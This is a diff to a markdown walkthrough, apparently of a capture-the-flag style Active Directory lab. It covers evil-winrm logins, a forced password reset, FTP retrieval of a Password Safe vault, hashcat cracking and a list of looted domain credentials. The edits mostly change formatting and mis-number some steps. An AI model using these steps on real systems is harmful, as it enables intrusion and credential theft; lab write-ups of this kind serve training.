@@ -115,7 +115,7 @@ evil-winrm -i 10.10.11.42 -u michael -p 'Password123!'
 - michael has ForceChangePassword over Benjamin. We can change benjamin's password with net rpc
 - ![[Pasted image 20260104213050.png]]
 
-## Step 6 - Michael → Benjamin pivot (password reset)
+## Step 6 - Michael to Benjamin pivot (password reset)
 1) **Command**
 ```bash
 evil-winrm -i 10.10.11.42 -u michael -p 'Password123!'
@@ -160,32 +160,32 @@ nxc ftp 10.10.11.42 -u benjamin -p 'Password123!' --get Backup.psafe3
 4) **Next**
 - Crack `Backup.psafe3` and extract credentials.
 
-## Step 8 - Crack Password Safe vault
-1) **Command**
+## Step 8 - Crack Password Safe vault  
+1) **Command**  
 ```bash
 file Backup.psafe3
 hashcat -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt --force
 passwordsafe Backup.psafe3
-```
-- `file`: identify the file type.
-- `hashcat -m 5200`: Password Safe v3 hash mode.
-- `--force`: allow execution even if hashcat warns about the environment.
-- `passwordsafe`: open the vault using the cracked password.
+```  
+- `file`: identify the file type.  
+- `hashcat -m 5200`: Password Safe v3 hash mode.  
+- `--force`: allow execution even if hashcat warns about the environment.  
+- `passwordsafe`: open the vault using the cracked password.  
 
-2) **What good output looks like**
-- `file` reports Password Safe v3 format.
-- Hashcat recovers the vault password: `tekieromucho`.
-- Vault reveals user credentials.
+2) **What good output looks like**  
+- `file` reports Password Safe v3 format.  
+- Hashcat recovers the vault password: `tekieromucho`.  
+- Vault reveals user credentials.  
 
-3) **Analysis**
-- The vault provided multiple domain creds, captured in `loot/users.txt`:
-  - `alexander : UrkIbagoxMyUGw0aPlj9B0AXSea4Sw`
-  - `emily : UXLCI5iETUsIBoFVTj8yQFKoHjXmb`
-  - `emma : WwANQWnmJnGV07WQN8bMS7FMAbjNur`
-  - `ethan : limpbizkit` (later cracked from Kerberoast)
+2) **Analysis**  
+- The vault provided multiple domain creds, captured in `loot/users.txt`:  
+  - `alexander : UrkIbagoxMyUGw0aPlj9B0AXSea4Sw`  
+  - `emily : UXLCI5iETUsIBoFVTj8yQFKoHjXmb`  
+  - `emma : WwANQWnmJnGV07WQN8bMS7FMAbjNur`  
+  - `ethan : limpbizkit` (later cracked from Kerberoast)  
 
-4) **Next**
-- Use a valid low-priv user to Kerberoast.
+2) **Next**  
+- Use a valid low-priv user to Kerberoast.  
 
 ## Step 9 - Targeted Kerberoast
 1) **Command**
